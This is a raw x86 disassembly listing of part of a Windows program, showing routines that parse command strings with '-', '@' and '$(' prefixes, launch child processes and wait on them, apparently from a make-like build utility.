  406535:	mov    WORD PTR [eax],dx
  406538:	mov    WORD PTR [esi+eax*1+0x2],dx
  40653d:	mov    esi,DWORD PTR [ebp-0x630]
  406543:	mov    WORD PTR [eax+edi*2+0x4],cx
  406548:	mov    eax,DWORD PTR [ebp-0x634]
  40654e:	mov    edi,DWORD PTR [ebp-0x62c]
  406554:	mov    WORD PTR [eax],dx
  406557:	push   esi
  406558:	mov    esi,DWORD PTR ds:0x43754c
  40655e:	call   esi
  406560:	pop    ecx
  406561:	push   edi
  406562:	call   esi
  406564:	pop    ecx
  406565:	lea    ecx,[ebp-0x214]
  40656b:	cmp    ebx,ecx
  40656d:	je     0x406573
  40656f:	push   ebx
  406570:	call   esi
  406572:	pop    ecx
  406573:	mov    al,0x1
  406575:	jmp    0x4065a1
  406577:	mov    esi,DWORD PTR [ebp-0x630]
  40657d:	push   esi
  40657e:	call   DWORD PTR ds:0x43754c
  406584:	pop    ecx
  406585:	push   edi
  406586:	call   DWORD PTR ds:0x43754c
  40658c:	lea    eax,[ebp-0x214]
  406592:	pop    ecx
  406593:	cmp    ebx,eax
  406595:	je     0x40659f
  406597:	push   ebx
  406598:	call   DWORD PTR ds:0x43754c
  40659e:	pop    ecx
  40659f:	xor    al,al
  4065a1:	mov    ecx,DWORD PTR [ebp-0x8]
  4065a4:	pop    edi
  4065a5:	pop    esi
  4065a6:	xor    ecx,ebp
  4065a8:	pop    ebx
  4065a9:	call   0x40fd0b
  4065ae:	leave  
  4065af:	ret    0x4
  4065b2:	push   ebp
  4065b3:	mov    ebp,esp
  4065b5:	sub    esp,0x448
  4065bb:	mov    eax,ds:0x411018
  4065c0:	xor    eax,ebp
  4065c2:	mov    DWORD PTR [ebp-0x8],eax
  4065c5:	cmp    DWORD PTR ds:0x431f1c,0x0
  4065cc:	mov    eax,DWORD PTR [ebp+0x10]
  4065cf:	push   ebx
  4065d0:	push   esi
  4065d1:	push   edi
  4065d2:	mov    bl,dl
  4065d4:	mov    DWORD PTR [ebp-0x424],ecx
  4065da:	mov    DWORD PTR [ebp-0x440],eax
  4065e0:	jne    0x4065f2
  4065e2:	call   0x406e58
  4065e7:	mov    ecx,DWORD PTR [ebp-0x424]
  4065ed:	mov    ds:0x431f1c,eax
  4065f2:	movzx  eax,WORD PTR [ecx]
  4065f5:	xor    edx,edx
  4065f7:	inc    edx
  4065f8:	push   0x2
  4065fa:	pop    edi
  4065fb:	mov    DWORD PTR [ebp-0x444],edx
  406601:	cmp    eax,0x2d
  406604:	je     0x406629
  406606:	cmp    eax,0x40
  406609:	jne    0x40661b
  40660b:	add    ecx,edi
  40660d:	cmp    BYTE PTR [ebp+0x8],0x0
  406611:	mov    DWORD PTR [ebp-0x424],ecx
  406617:	je     0x40661b
  406619:	xor    ebx,ebx
  40661b:	mov    bh,BYTE PTR [ebp+0xc]
  40661e:	mov    BYTE PTR [ebp-0x425],bh
  406624:	jmp    0x4066c3
  406629:	add    ecx,edi
  40662b:	mov    DWORD PTR [ebp-0x424],ecx
  406631:	movzx  eax,WORD PTR [ecx]
  406634:	push   eax
  406635:	mov    BYTE PTR [ebp-0x425],dl
  40663b:	call   DWORD PTR ds:0x4373f4
  406641:	pop    ecx
  406642:	test   eax,eax
  406644:	je     0x4066b6
  406646:	mov    esi,DWORD PTR [ebp-0x424]
  40664c:	push   0xa
  40664e:	lea    eax,[ebp-0x424]
  406654:	push   eax
  406655:	push   esi
  406656:	call   DWORD PTR ds:0x4373f8
  40665c:	add    esp,0xc
  40665f:	mov    ds:0x431f20,eax
  406664:	call   DWORD PTR ds:0x4373fc
  40666a:	push   0x22
  40666c:	pop    ecx
  40666d:	cmp    DWORD PTR [eax],ecx
  40666f:	jne    0x40668d
  406671:	mov    eax,DWORD PTR [ebp-0x424]
  406677:	xor    ecx,ecx
  406679:	push   esi
  40667a:	mov    WORD PTR [eax],cx
  40667d:	xor    eax,eax
  40667f:	push   0x436
  406684:	push   eax
  406685:	call   0x405021
  40668a:	add    esp,0xc
  40668d:	mov    eax,DWORD PTR [ebp-0x424]
  406693:	mov    esi,DWORD PTR ds:0x43753c
  406699:	jmp    0x4066a9
  40669b:	mov    eax,DWORD PTR [ebp-0x424]
  4066a1:	add    eax,edi
  4066a3:	mov    DWORD PTR [ebp-0x424],eax
  4066a9:	movzx  eax,WORD PTR [eax]
  4066ac:	push   eax
  4066ad:	call   esi
  4066af:	pop    ecx
  4066b0:	test   eax,eax
  4066b2:	jne    0x40669b
  4066b4:	jmp    0x4066bd
  4066b6:	or     DWORD PTR ds:0x431f20,0xffffffff
  4066bd:	mov    ecx,DWORD PTR [ebp-0x424]
  4066c3:	xor    edi,edi
  4066c5:	cmp    WORD PTR [ecx],di
  4066c8:	jne    0x4066d1
  4066ca:	xor    eax,eax
  4066cc:	jmp    0x406e41
  4066d1:	mov    edx,ecx
  4066d3:	lea    esi,[edx+0x2]
  4066d6:	mov    ax,WORD PTR [edx]
  4066d9:	add    edx,0x2
  4066dc:	cmp    ax,di
  4066df:	jne    0x4066d6
  4066e1:	sub    edx,esi
  4066e3:	sar    edx,1
  4066e5:	mov    eax,0x8000
  4066ea:	cmp    edx,eax
  4066ec:	jae    0x406706
  4066ee:	push   ecx
  4066ef:	push   eax
  4066f0:	push   0x4114c0
  4066f5:	call   DWORD PTR ds:0x4373d0
  4066fb:	mov    ecx,DWORD PTR [ebp-0x424]
  406701:	add    esp,0xc
  406704:	jmp    0x40670e
  406706:	xor    eax,eax
  406708:	mov    ds:0x4114c0,ax
  40670e:	call   0x40dd18
  406713:	mov    esi,eax
  406715:	mov    DWORD PTR [ebp-0x43c],esi
  40671b:	test   bl,bl
  40671d:	je     0x406731
  40671f:	push   esi
  406720:	push   0x401700
  406725:	call   0x40c2d0
  40672a:	pop    ecx
  40672b:	pop    ecx
  40672c:	call   0x40c2b2
  406731:	xor    eax,eax
  406733:	push   esi
  406734:	xor    edx,edx
  406736:	lea    ecx,[ebp-0x430]
  40673c:	mov    ebx,eax
  40673e:	call   0x4051b9
  406743:	mov    edi,DWORD PTR [ebp-0x430]
  406749:	test   edi,edi
  40674b:	jne    0x406754
  40674d:	xor    esi,esi
  40674f:	jmp    0x406df1
  406754:	xor    ecx,ecx
  406756:	push   0x4
  406758:	pop    edx
  406759:	lea    eax,[edi+0x5]
  40675c:	mul    edx
  40675e:	seto   cl
  406761:	neg    ecx
  406763:	or     ecx,eax
  406765:	call   0x40a2fb
  40676a:	mov    ebx,eax
  40676c:	push   esi
  40676d:	mov    edx,ebx
  40676f:	lea    ecx,[ebp-0x430]
  406775:	mov    DWORD PTR [ebp-0x448],ebx
  40677b:	call   0x4051b9
  406780:	cmp    DWORD PTR [ebx],0x0
  406783:	je     0x406852
  406789:	mov    eax,ds:0x431f18
  40678e:	test   eax,eax
  406790:	je     0x406852
  406796:	push   eax
  406797:	push   DWORD PTR [ebx]
  406799:	call   DWORD PTR ds:0x437548
  40679f:	pop    ecx
  4067a0:	pop    ecx
  4067a1:	test   eax,eax
  4067a3:	jne    0x406852
  4067a9:	cmp    DWORD PTR ds:0x4114b8,eax
  4067af:	jne    0x40684b
  4067b5:	mov    eax,ds:0x437448
  4067ba:	push   0x4010a4
  4067bf:	mov    eax,DWORD PTR [eax]
  4067c1:	push   eax
  4067c2:	mov    DWORD PTR [ebp-0x42c],eax
  4067c8:	mov    ds:0x4114b8,eax
  4067cd:	call   DWORD PTR ds:0x437544
  4067d3:	pop    ecx
  4067d4:	pop    ecx
  4067d5:	test   eax,eax
  4067d7:	je     0x40684b
  4067d9:	mov    esi,DWORD PTR ds:0x4114b8
  4067df:	xor    edx,edx
  4067e1:	lea    ecx,[esi+0x2]
  4067e4:	mov    ax,WORD PTR [esi]
  4067e7:	add    esi,0x2
  4067ea:	cmp    ax,dx
  4067ed:	jne    0x4067e4
  4067ef:	sub    esi,ecx
  4067f1:	sar    esi,1
  4067f3:	add    esi,0x3
  4067f6:	xor    ecx,ecx
  4067f8:	push   0x2
  4067fa:	pop    edx
  4067fb:	mov    eax,esi
  4067fd:	mul    edx
  4067ff:	seto   cl
  406802:	neg    ecx
  406804:	or     ecx,eax
  406806:	call   0x40a2fb
  40680b:	push   0x401098
  406810:	push   esi
  406811:	push   eax
  406812:	mov    ds:0x4114b8,eax
  406817:	call   DWORD PTR ds:0x4373d0
  40681d:	add    esp,0xc
  406820:	push   DWORD PTR [ebp-0x42c]
  406826:	push   esi
  406827:	push   DWORD PTR ds:0x4114b8
  40682d:	call   DWORD PTR ds:0x4373d4
  406833:	add    esp,0xc
  406836:	push   0x401098
  40683b:	push   esi
  40683c:	push   DWORD PTR ds:0x4114b8
  406842:	call   DWORD PTR ds:0x4373d4
  406848:	add    esp,0xc
  40684b:	mov    eax,ds:0x4114b8
  406850:	mov    DWORD PTR [ebx],eax
  406852:	cmp    BYTE PTR [ebp+0x8],0x0
  406856:	jne    0x406898
  406858:	lea    eax,[ebp-0x438]
  40685e:	push   eax
  40685f:	mov    edx,ebx
  406861:	mov    ecx,edi
  406863:	call   0x405b9b
  406868:	test   al,al
  40686a:	je     0x40688b
  40686c:	mov    esi,DWORD PTR [ebp-0x438]
  406872:	test   esi,esi
  406874:	je     0x40688d
  406876:	mov    edi,DWORD PTR [ebp-0x440]
  40687c:	test   edi,edi
  40687e:	je     0x40688d
  406880:	mov    ecx,DWORD PTR [ebx]
  406882:	call   0x40dd18
  406887:	mov    DWORD PTR [edi],eax
  406889:	jmp    0x40688d
  40688b:	xor    esi,esi
  40688d:	mov    edi,DWORD PTR [ebp-0x430]
  406893:	jmp    0x406df1
  406898:	push   0x40170c
  40689d:	push   DWORD PTR [ebp-0x424]
  4068a3:	call   DWORD PTR ds:0x437544
  4068a9:	neg    eax
  4068ab:	sbb    al,al
  4068ad:	inc    al
  4068af:	pop    ecx
  4068b0:	pop    ecx
  4068b1:	mov    edx,ebx
  4068b3:	mov    ecx,edi
  4068b5:	mov    DWORD PTR [ebp-0x42c],eax
  4068bb:	lea    eax,[ebp-0x438]
  4068c1:	push   eax
  4068c2:	call   0x405b9b
  4068c7:	test   al,al
  4068c9:	je     0x406957
  4068cf:	mov    esi,DWORD PTR [ebp-0x438]
  4068d5:	xor    eax,eax
  4068d7:	mov    BYTE PTR [ebp-0x41d],al
  4068dd:	mov    edi,DWORD PTR [ebp-0x430]
  4068e3:	cmp    esi,0xffffffff
  4068e6:	jne    0x406dc7
  4068ec:	cmp    BYTE PTR [ebp-0x425],0x0
  4068f3:	jne    0x40674d
  4068f9:	call   DWORD PTR ds:0x4373fc
  4068ff:	mov    eax,DWORD PTR [eax]
  406901:	sub    eax,0x0
  406904:	je     0x406dcb
  40690a:	push   0x2
  40690c:	pop    ecx
  40690d:	sub    eax,ecx
  40690f:	je     0x406db5
  406915:	sub    eax,0xa
  406918:	je     0x406d9a
  40691e:	call   DWORD PTR ds:0x4373fc
  406924:	push   DWORD PTR [eax]
  406926:	lea    eax,[ebp-0x3a4]
  40692c:	push   0xc8
  406931:	push   eax
  406932:	call   DWORD PTR ds:0x437454
  406938:	add    esp,0xc
  40693b:	lea    eax,[ebp-0x3a4]
  406941:	push   eax
  406942:	push   0x415
  406947:	xor    eax,eax
  406949:	push   eax
  40694a:	call   0x405021
  40694f:	add    esp,0xc
  406952:	jmp    0x406dcb
  406957:	mov    edx,DWORD PTR [ebp-0x424]
  40695d:	mov    ecx,edx
  40695f:	xor    edi,edi
  406961:	lea    esi,[ecx+0x2]
  406964:	mov    ax,WORD PTR [ecx]
  406967:	add    ecx,0x2
  40696a:	cmp    ax,di
  40696d:	jne    0x406964
  40696f:	sub    ecx,esi
  406971:	sar    ecx,1
  406973:	cmp    ecx,0x1000
  406979:	jae    0x406990
  40697b:	cmp    BYTE PTR [ebp-0x42c],0x0
  406982:	jne    0x406990
  406984:	mov    BYTE PTR [ebp-0x41d],0x1
  40698b:	jmp    0x406afa
  406990:	lea    eax,[ebp-0x42c]
  406996:	push   eax
  406997:	lea    eax,[ebp-0x434]
  40699d:	or     esi,0xffffffff
  4069a0:	push   eax
  4069a1:	mov    ecx,edx
  4069a3:	mov    DWORD PTR [ebp-0x434],esi
  4069a9:	mov    DWORD PTR [ebp-0x42c],esi
  4069af:	call   0x405e48
  4069b4:	mov    BYTE PTR [ebp-0x41d],al
  4069ba:	test   al,al
  4069bc:	jne    0x406a52
  4069c2:	mov    ecx,DWORD PTR [ebp-0x424]
  4069c8:	lea    edx,[ecx+0x2]
  4069cb:	mov    ax,WORD PTR [ecx]
  4069ce:	add    ecx,0x2
  4069d1:	cmp    ax,di
  4069d4:	jne    0x4069cb
  4069d6:	sub    ecx,edx
  4069d8:	sar    ecx,1
  4069da:	cmp    ecx,0x8000
  4069e0:	jb     0x4069f8
  4069e2:	push   DWORD PTR [ebp-0x424]
  4069e8:	xor    eax,eax
  4069ea:	push   0x447
  4069ef:	push   eax
  4069f0:	call   0x405021
  4069f5:	add    esp,0xc
  4069f8:	cmp    DWORD PTR [ebp-0x434],esi
  4069fe:	jne    0x406a08
  406a00:	cmp    DWORD PTR [ebp-0x42c],esi
  406a06:	je     0x406a35
  406a08:	mov    ecx,DWORD PTR [ebp-0x43c]
  406a0e:	push   ecx
  406a0f:	call   DWORD PTR ds:0x43754c
  406a15:	pop    ecx
  406a16:	mov    ecx,DWORD PTR [ebp-0x424]
  406a1c:	call   0x40dd18
  406a21:	push   eax
  406a22:	mov    edx,ebx
  406a24:	lea    ecx,[ebp-0x430]
  406a2a:	mov    DWORD PTR [ebp-0x43c],eax
  406a30:	call   0x4051b9
  406a35:	push   ecx
  406a36:	mov    ecx,DWORD PTR [ebx]
  406a38:	lea    edx,[ebp-0x214]
  406a3e:	call   0x4060ee
  406a43:	test   al,al
  406a45:	jne    0x406b3d
  406a4b:	mov    BYTE PTR [ebp-0x41d],0x1
  406a52:	mov    esi,DWORD PTR [ebp-0x438]
  406a58:	cmp    DWORD PTR [ebp-0x434],0xffffffff
  406a5f:	mov    edi,DWORD PTR ds:0x437434
  406a65:	je     0x406aa1
  406a67:	call   DWORD PTR ds:0x43741c
  406a6d:	push   eax
  406a6e:	call   DWORD PTR ds:0x437428
  406a74:	pop    ecx
  406a75:	push   eax
  406a76:	push   DWORD PTR [ebp-0x434]
  406a7c:	call   DWORD PTR ds:0x437424
  406a82:	pop    ecx
  406a83:	pop    ecx
  406a84:	cmp    eax,0xffffffff
  406a87:	jne    0x406a98
  406a89:	xor    eax,eax
  406a8b:	push   0x411
  406a90:	push   eax
  406a91:	call   0x405021
  406a96:	pop    ecx
  406a97:	pop    ecx
  406a98:	push   DWORD PTR [ebp-0x434]
  406a9e:	call   edi
  406aa0:	pop    ecx
  406aa1:	cmp    DWORD PTR [ebp-0x42c],0xffffffff
  406aa8:	je     0x406ae7
  406aaa:	call   DWORD PTR ds:0x43741c
  406ab0:	add    eax,0x20
  406ab3:	push   eax
  406ab4:	call   DWORD PTR ds:0x437428
  406aba:	pop    ecx
  406abb:	push   eax
  406abc:	push   DWORD PTR [ebp-0x42c]
  406ac2:	call   DWORD PTR ds:0x437424
  406ac8:	pop    ecx
  406ac9:	pop    ecx
  406aca:	cmp    eax,0xffffffff
  406acd:	jne    0x406ade
  406acf:	xor    eax,eax
  406ad1:	push   0x411
  406ad6:	push   eax
  406ad7:	call   0x405021
  406adc:	pop    ecx
  406add:	pop    ecx
  406ade:	push   DWORD PTR [ebp-0x42c]
  406ae4:	call   edi
  406ae6:	pop    ecx
  406ae7:	cmp    BYTE PTR [ebp-0x41d],0x0
  406aee:	je     0x4068dd
  406af4:	mov    edx,DWORD PTR [ebp-0x424]
  406afa:	xor    eax,eax
  406afc:	mov    ecx,edx
  406afe:	mov    BYTE PTR [ebp-0x426],al
  406b04:	lea    esi,[ecx+0x2]
  406b07:	xor    edi,edi
  406b09:	mov    ax,WORD PTR [ecx]
  406b0c:	add    ecx,0x2
  406b0f:	cmp    ax,di
  406b12:	jne    0x406b09
  406b14:	sub    ecx,esi
  406b16:	sar    ecx,1
  406b18:	push   edx
  406b19:	cmp    ecx,0x1000
  406b1f:	jae    0x406c5b
  406b25:	push   0x8000
  406b2a:	push   0x4114c0
  406b2f:	call   DWORD PTR ds:0x4373d0
  406b35:	add    esp,0xc
  406b38:	jmp    0x406c6d
  406b3d:	push   0x22
  406b3f:	pop    esi
  406b40:	cmp    WORD PTR [ebp-0x214],si
  406b47:	jne    0x406bad
  406b49:	lea    esi,[ebp-0x214]
  406b4f:	push   0x2
  406b51:	lea    ecx,[esi+0x2]
  406b54:	xor    edx,edx
  406b56:	pop    edi
  406b57:	mov    ax,WORD PTR [esi]
  406b5a:	add    esi,edi
  406b5c:	cmp    ax,dx
  406b5f:	jne    0x406b57
  406b61:	sub    esi,ecx
  406b63:	push   0x22
  406b65:	sar    esi,1
  406b67:	pop    ecx
  406b68:	cmp    WORD PTR [ebp+esi*2-0x216],cx
  406b70:	jne    0x406baa
  406b72:	lea    eax,[esi+esi*1]
  406b75:	push   eax
  406b76:	lea    eax,[ebp-0x212]
  406b7c:	push   eax
  406b7d:	lea    eax,[ebp-0x214]
  406b83:	push   eax
  406b84:	call   DWORD PTR ds:0x437444
  406b8a:	lea    esi,[esi*2-0x4]
  406b91:	add    esp,0xc
  406b94:	cmp    esi,0x208
  406b9a:	jae    0x406e52
  406ba0:	xor    eax,eax
  406ba2:	mov    WORD PTR [ebp+esi*1-0x214],ax
  406baa:	push   0x22
  406bac:	pop    esi
  406bad:	lea    eax,[ebp-0x214]
  406bb3:	push   0x20
  406bb5:	push   eax
  406bb6:	mov    DWORD PTR [ebx],eax
  406bb8:	call   DWORD PTR ds:0x437540
  406bbe:	pop    ecx
  406bbf:	pop    ecx
  406bc0:	test   eax,eax
  406bc2:	je     0x406c09
  406bc4:	lea    eax,[ebp-0x214]
  406bca:	push   eax
  406bcb:	lea    eax,[ebp-0x41a]
  406bd1:	push   0x103
  406bd6:	push   eax
  406bd7:	mov    WORD PTR [ebp-0x41c],si
  406bde:	call   DWORD PTR ds:0x4373d0
  406be4:	add    esp,0xc
  406be7:	lea    eax,[ebp-0x41c]
  406bed:	push   0x401098
  406bf2:	push   0x104
  406bf7:	push   eax
  406bf8:	call   DWORD PTR ds:0x4373d4
  406bfe:	lea    eax,[ebp-0x41c]
  406c04:	add    esp,0xc
  406c07:	mov    DWORD PTR [ebx],eax
  406c09:	mov    edi,DWORD PTR ds:0x4373fc
  406c0f:	call   edi
  406c11:	xor    ecx,ecx
  406c13:	mov    DWORD PTR [eax],ecx
  406c15:	push   ebx
  406c16:	lea    eax,[ebp-0x214]
  406c1c:	push   eax
  406c1d:	push   ecx
  406c1e:	call   DWORD PTR ds:0x43744c
  406c24:	mov    esi,eax
  406c26:	add    esp,0xc
  406c29:	cmp    esi,0xffffffff
  406c2c:	jne    0x406a58
  406c32:	call   edi
  406c34:	cmp    DWORD PTR [eax],0xc
  406c37:	je     0x406a58
  406c3d:	call   DWORD PTR ds:0x437450
  406c43:	cmp    DWORD PTR [eax],0xc1
  406c49:	jne    0x406a58
  406c4f:	mov    BYTE PTR [ebp-0x41d],0x1
  406c56:	jmp    0x406a58
  406c5b:	xor    eax,eax
  406c5d:	push   0x447
  406c62:	push   eax
  406c63:	call   0x405021
  406c68:	add    esp,0xc
  406c6b:	xor    edi,edi
  406c6d:	mov    edx,DWORD PTR [ebx]
  406c6f:	push   0x22
  406c71:	pop    eax
  406c72:	cmp    WORD PTR [edx],ax
  406c75:	jne    0x406cd9
  406c77:	mov    ecx,edx
  406c79:	lea    esi,[ecx+0x2]
  406c7c:	mov    ax,WORD PTR [ecx]
  406c7f:	add    ecx,0x2
  406c82:	cmp    ax,di
  406c85:	jne    0x406c7c
  406c87:	sub    ecx,esi
  406c89:	push   0x22
  406c8b:	sar    ecx,1
  406c8d:	pop    eax
  406c8e:	cmp    WORD PTR [edx+ecx*2-0x2],ax
  406c93:	jne    0x406cd9
  406c95:	mov    edi,DWORD PTR [ebp-0x430]
  406c9b:	mov    DWORD PTR [ebp-0x42c],edi
  406ca1:	lea    esi,[edi-0x1]
  406ca4:	jmp    0x406cbb
  406ca6:	push   0x401098
  406cab:	push   DWORD PTR [ebx+esi*4]
  406cae:	call   DWORD PTR ds:0x437544
  406cb4:	pop    ecx
  406cb5:	pop    ecx
  406cb6:	test   eax,eax
  406cb8:	jne    0x406cc2
  406cba:	dec    esi
  406cbb:	cmp    esi,0x1
  406cbe:	jge    0x406ca6
  406cc0:	jmp    0x406ce5
  406cc2:	mov    DWORD PTR [ebx+edi*4],0x401098
  406cc9:	inc    edi
  406cca:	xor    eax,eax
  406ccc:	mov    dl,0x1
  406cce:	mov    DWORD PTR [ebp-0x42c],edi
  406cd4:	mov    DWORD PTR [ebx+edi*4],eax
  406cd7:	jmp    0x406ceb
  406cd9:	mov    edi,DWORD PTR [ebp-0x430]
  406cdf:	mov    DWORD PTR [ebp-0x42c],edi
  406ce5:	mov    dl,BYTE PTR [ebp-0x426]
  406ceb:	mov    ecx,edi
  406ced:	test   edi,edi
  406cef:	js     0x406cfb
  406cf1:	mov    eax,DWORD PTR [ebx+ecx*4]
  406cf4:	dec    ecx
  406cf5:	mov    DWORD PTR [ebx+ecx*4+0xc],eax
  406cf9:	jns    0x406cf1
  406cfb:	mov    eax,ds:0x431f1c
  406d00:	mov    DWORD PTR [ebx],eax
  406d02:	mov    eax,0x401718
  406d07:	test   dl,dl
  406d09:	jne    0x406d10
  406d0b:	mov    eax,0x401724
  406d10:	mov    DWORD PTR [ebx+0x4],eax
  406d13:	call   DWORD PTR ds:0x4373fc
  406d19:	xor    ecx,ecx
  406d1b:	push   ebx
  406d1c:	mov    DWORD PTR [eax],ecx
  406d1e:	push   DWORD PTR [ebx]
  406d20:	push   0x1
  406d22:	call   DWORD PTR ds:0x43744c
  406d28:	add    esp,0xc
  406d2b:	mov    DWORD PTR [ebp-0x434],eax
  406d31:	cmp    eax,0xffffffff
  406d34:	jne    0x406d3d
  406d36:	or     esi,eax
  406d38:	jmp    0x4068ec
  406d3d:	push   0xffffffff
  406d3f:	push   eax
  406d40:	call   DWORD PTR ds:0x4372f8
  406d46:	mov    ebx,DWORD PTR [ebp-0x434]
  406d4c:	xor    eax,eax
  406d4e:	mov    edi,eax
  406d50:	lea    eax,[ebp-0x438]
  406d56:	push   eax
  406d57:	push   ebx
  406d58:	call   DWORD PTR ds:0x4372fc
  406d5e:	mov    esi,DWORD PTR [ebp-0x438]
  406d64:	cmp    esi,0x103
  406d6a:	jne    0x406d7d
  406d6c:	push   0x3e8
  406d71:	call   DWORD PTR ds:0x437300
  406d77:	inc    edi
  406d78:	cmp    edi,0xa
  406d7b:	jb     0x406d50
  406d7d:	push   DWORD PTR [ebp-0x434]
  406d83:	call   DWORD PTR ds:0x437304
  406d89:	mov    edi,DWORD PTR [ebp-0x42c]
  406d8f:	mov    ebx,DWORD PTR [ebp-0x448]
  406d95:	jmp    0x4068e3
  406d9a:	cmp    BYTE PTR [ebp-0x41d],0x0
  406da1:	je     0x406da8
  406da3:	mov    eax,DWORD PTR [ebx+0x8]
  406da6:	jmp    0x406daa
  406da8:	mov    eax,DWORD PTR [ebx]
  406daa:	push   eax
  406dab:	push   0x43a
  406db0:	jmp    0x406947
  406db5:	push   DWORD PTR [ebx]
  406db7:	xor    eax,eax
  406db9:	push   0x439
  406dbe:	push   eax
  406dbf:	call   0x405021
  406dc4:	add    esp,0xc
  406dc7:	test   esi,esi
  406dc9:	je     0x406df1
  406dcb:	cmp    DWORD PTR [ebp-0x440],0x0
  406dd2:	je     0x406df1
  406dd4:	cmp    BYTE PTR [ebp-0x41d],0x0
  406ddb:	je     0x406de2
  406ddd:	mov    ecx,DWORD PTR [ebx+0x8]
  406de0:	jmp    0x406de4
  406de2:	mov    ecx,DWORD PTR [ebx]
  406de4:	call   0x40dd18
  406de9:	mov    ecx,DWORD PTR [ebp-0x440]
  406def:	mov    DWORD PTR [ecx],eax
  406df1:	xor    eax,eax
  406df3:	add    edi,0x5
  406df6:	je     0x406e18
  406df8:	mov    ecx,DWORD PTR [ebp-0x43c]
  406dfe:	cmp    DWORD PTR [ebx+eax*4],0x0
  406e02:	je     0x406e18
  406e04:	cmp    DWORD PTR [ebx+eax*4],ecx
  406e07:	je     0x406e10
  406e09:	inc    eax
  406e0a:	cmp    eax,edi
  406e0c:	jb     0x406dfe
  406e0e:	jmp    0x406e18
  406e10:	xor    eax,eax
  406e12:	mov    BYTE PTR [ebp-0x444],al
  406e18:	test   ebx,ebx
  406e1a:	je     0x406e24
  406e1c:	push   ebx
  406e1d:	call   DWORD PTR ds:0x43754c
  406e23:	pop    ecx
  406e24:	mov    eax,DWORD PTR [ebp-0x43c]
  406e2a:	test   eax,eax
  406e2c:	je     0x406e3f
  406e2e:	cmp    BYTE PTR [ebp-0x444],0x0
  406e35:	je     0x406e3f
  406e37:	push   eax
  406e38:	call   DWORD PTR ds:0x43754c
  406e3e:	pop    ecx
  406e3f:	mov    eax,esi
  406e41:	mov    ecx,DWORD PTR [ebp-0x8]
  406e44:	pop    edi
  406e45:	pop    esi
  406e46:	xor    ecx,ebp
  406e48:	pop    ebx
  406e49:	call   0x40fd0b
  406e4e:	leave  
  406e4f:	ret    0xc
  406e52:	call   0x40fe50
  406e57:	int3   
  406e58:	push   ebp
  406e59:	mov    ebp,esp
  406e5b:	sub    esp,0x214
  406e61:	mov    eax,ds:0x411018
  406e66:	xor    eax,ebp
  406e68:	mov    DWORD PTR [ebp-0x4],eax
  406e6b:	push   esi
  406e6c:	xor    esi,esi
  406e6e:	push   0x40172c
  406e73:	lea    eax,[ebp-0x214]
  406e79:	push   esi
  406e7a:	push   eax
  406e7b:	mov    DWORD PTR [ebp-0x214],esi
  406e81:	call   DWORD PTR ds:0x437400
  406e87:	mov    ecx,DWORD PTR [ebp-0x214]
  406e8d:	add    esp,0xc
  406e90:	test   ecx,ecx
  406e92:	je     0x406eac
  406e94:	call   0x40dd18
  406e99:	push   DWORD PTR [ebp-0x214]
  406e9f:	mov    esi,eax
  406ea1:	call   DWORD PTR ds:0x43754c
  406ea7:	pop    ecx
  406ea8:	mov    eax,esi
  406eaa:	jmp    0x406ee7
  406eac:	lea    eax,[ebp-0x210]
  406eb2:	push   eax
  406eb3:	push   0x4016b0
  406eb8:	push   0x40173c
  406ebd:	call   DWORD PTR ds:0x437458
  406ec3:	add    esp,0xc
  406ec6:	cmp    WORD PTR [ebp-0x210],si
  406ecd:	jne    0x406edc
  406ecf:	push   0x420
  406ed4:	push   esi
  406ed5:	call   0x405021
  406eda:	pop    ecx
  406edb:	pop    ecx
  406edc:	lea    ecx,[ebp-0x210]
  406ee2:	call   0x40dd18
  406ee7:	mov    ecx,DWORD PTR [ebp-0x4]
  406eea:	xor    ecx,ebp
  406eec:	pop    esi
  406eed:	call   0x40fd0b
  406ef2:	leave  
  406ef3:	ret    
  406ef4:	push   ebp
  406ef5:	mov    ebp,esp
  406ef7:	sub    esp,0x1c
  406efa:	push   ebx
  406efb:	push   esi
  406efc:	mov    eax,ecx
  406efe:	mov    DWORD PTR [ebp-0x10],edx
  406f01:	xor    edx,edx
  406f03:	push   edi
  406f04:	mov    ebx,edx
  406f06:	mov    edi,edx
  406f08:	mov    DWORD PTR [ebp-0x14],eax
  406f0b:	mov    DWORD PTR [ebp-0xc],ebx
  406f0e:	mov    DWORD PTR [ebp-0x8],edi
  406f11:	mov    esi,eax
  406f13:	cmp    WORD PTR [eax],dx
  406f16:	je     0x406fb1
  406f1c:	mov    ebx,DWORD PTR ds:0x437540
  406f22:	cmp    WORD PTR [esi],0x24
  406f26:	mov    al,dl
  406f28:	jne    0x406fa2
  406f2a:	cmp    WORD PTR [esi+0x2],0x28
  406f2f:	jne    0x406f36
  406f31:	add    esi,0x2
  406f34:	mov    al,0x1
  406f36:	push   0x3f
  406f38:	pop    edi
  406f39:	cmp    WORD PTR [esi+0x2],di
  406f3d:	mov    edi,edx
  406f3f:	jne    0x406f6a
  406f41:	test   al,al
  406f43:	je     0x406fbf
  406f45:	movzx  eax,WORD PTR [esi+0x4]
  406f49:	push   eax
  406f4a:	push   0x40174c
  406f4f:	call   ebx
  406f51:	pop    ecx
  406f52:	pop    ecx
  406f53:	push   0x29
  406f55:	test   eax,eax
  406f57:	pop    eax
  406f58:	je     0x406f60
  406f5a:	cmp    WORD PTR [esi+0x6],ax
  406f5e:	je     0x406fbd
  406f60:	xor    edx,edx
  406f62:	cmp    WORD PTR [esi+0x4],ax
  406f66:	je     0x406fbf
  406f68:	jmp    0x406fa2
  406f6a:	push   0x2a
  406f6c:	add    esi,0x2
  406f6f:	pop    ecx
  406f70:	cmp    WORD PTR [esi],cx
  406f73:	jne    0x406fa2
  406f75:	cmp    WORD PTR [esi+0x2],cx
  406f79:	jne    0x406fa2
  406f7b:	test   al,al
  406f7d:	je     0x406fd4
  406f7f:	movzx  eax,WORD PTR [esi+0x4]
  406f83:	push   eax
  406f84:	push   0x40174c
  406f89:	call   ebx
  406f8b:	pop    ecx
  406f8c:	pop    ecx
  406f8d:	push   0x29
  406f8f:	test   eax,eax
  406f91:	pop    eax
  406f92:	je     0x406f9a
  406f94:	cmp    WORD PTR [esi+0x6],ax
  406f98:	je     0x406fcf
  406f9a:	xor    edx,edx
  406f9c:	cmp    WORD PTR [esi+0x4],ax
  406fa0:	je     0x406fd1
  406fa2:	add    esi,0x2
  406fa5:	cmp    WORD PTR [esi],dx
  406fa8:	jne    0x406f22
  406fae:	mov    ebx,DWORD PTR [ebp-0xc]
  406fb1:	cmp    WORD PTR [esi],dx
  406fb4:	jne    0x406fe1
  406fb6:	xor    al,al
  406fb8:	jmp    0x407142
  406fbd:	xor    edx,edx
  406fbf:	mov    edi,DWORD PTR ds:0x421f00
